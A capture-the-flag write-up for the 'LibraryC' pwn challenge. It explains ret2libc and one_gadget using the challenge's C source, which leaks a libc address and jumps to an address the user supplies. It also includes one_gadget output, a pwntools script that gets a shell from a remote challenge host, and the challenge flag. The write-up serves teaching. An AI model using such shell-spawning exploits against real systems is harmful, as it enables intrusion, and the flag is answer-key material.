# LibraryC
![](https://img.shields.io/badge/category-pwn-blue)

> I have this amazing library full of functions and where they’re stored. Do you need help finding something in this vast library? Perhaps a flag?
We have given you everything you need, can you figure out where to jump to to get the flag?



<details>
<summary>Hint:</summary>
https://libc.blukat.me

The input asked where you want to jump to allows you to jump anywhere provided a hex number. Providing 0x0123456789abc will jump to address 0x0123456789abc
</details>

This was meant to be an introduction to one_gadgets and ret2libc. Libc are pieces of code which contains a ton of helper functions that would exist within c. These include `printf`, `scanf`, `gets`, `puts` and more.

Let's take a look at the code,

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	printf("Hello user, do you have what it takes to get a shell? Let's find out!\n");
	long long val;
	printf("Please choose a libc function..\n");
	printf("1: system()\n");
	printf("2: popen()\n");
	printf("3: fread()\n");
	printf("4: fwrite()\n");
	printf(">>");
	scanf("%lld",&val);
	if(val==1){
		printf("%p\n",system);
	}else if(val==2){
		printf("%p\n",popen);
	}else if(val==3){
		printf("%p\n",fread);
	}else if(val==4){
		printf("%p\n",fwrite);
	}else{
		printf("I don't know what that is\n");
	}
	printf("Now that you have what you need, give us an address to jump to\n");
	scanf("%llp",&val);
	printf("Ok, now calling to %llp\n",val);
	((void(*)(void))val)();
	return 0;
}
```

Libc contains several helper function which the program calls, the libc is loaded off a random address, meaning we're unable to know where the functions are located unless we have a libc leak. Libcs are also loaded with the lowest bytes being aligned to `0000`, meaning the lowest bytes would always be the same.

What we can do is leak several libc addresses, and use the provided link in the hint to first figure out the libc the remote server uses.

As the remote server is now offline, here's what I got locally.

https://libc.blukat.me/?q=system%3A0x7fd8a8ef8410%2Cfread%3A0x7f42d2c2dfe0%2Cpopen%3Af500

We're able to take any one of these libcs (I'm assuming because they're the same)

We download one of the libcs and run `one_gadget` on it. [one_gadget](https://github.com/david942j/one_gadget) is a public project, it finds an address within libc which if jump to, will create a shell.

```
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

We can also get the offset to a libc function (say `system()`) using the libc database.

`system: 0x055410`

Meaning the offset from the `system` address to the `one_gadget` address will be

`0xe6c7e-0x055410`

We're now able to create a script

```python
from pwn import *

con = remote('159.203.32.136',30002)
con.sendline('1')

LIBC_SYSTEM = con.recv().split('0x')[-1]
LIBC_SYSTEM = int(LIBC_SYSTEM, 16)
ONE_GADGET = LIBC_SYSTEM+0xe6c7e-0x055410
con.sendline(hex(ONE_GADGET))
con.interactive()
```

`CTF{find_libc_jump_to_gadget_win}`
